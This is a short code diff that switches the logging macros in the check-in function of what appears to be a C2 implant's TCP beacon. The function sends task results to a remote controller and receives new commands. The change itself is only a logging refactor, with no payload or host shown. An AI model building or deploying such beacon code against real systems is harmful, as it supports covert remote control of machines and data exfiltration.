@@ -19,17 +19,17 @@ BeaconTcp::~BeaconTcp()
 
 void BeaconTcp::checkIn()
 {	
-	DEBUG("initConnection");
+	SPDLOG_DEBUG("initConnection");
 	while(!m_client->initConnection())
 	{
 		std::this_thread::sleep_for(std::chrono::milliseconds(333));
-		DEBUG("initConnection");
+		SPDLOG_DEBUG("initConnection");
 	}
 
 	std::string output;
 	taskResultsToCmd(output);
 
-	DEBUG("sending output.size " << std::to_string(output.size()));
+	SPDLOG_DEBUG("sending output.size {0}", std::to_string(output.size()));
 
 	bool res = m_client->sendData(output);
 	if(res)
@@ -38,7 +38,7 @@ void BeaconTcp::checkIn()
 		res=m_client->receive(input);
 		if(res)
 		{
-			DEBUG("received input.size " << std::to_string(input.size()));
+			SPDLOG_DEBUG("received input.size {0}", std::to_string(input.size()));
 
 			if(!input.empty())
 			{
@@ -46,10 +46,10 @@ void BeaconTcp::checkIn()
 			}
 		}
 		else
-			DEBUG("Receive failed");
+			SPDLOG_DEBUG("Receive failed");
 	}
 	else
-		DEBUG("Send failed");
+		SPDLOG_DEBUG("Send failed");
 
 	m_client->closeConnection();
 }
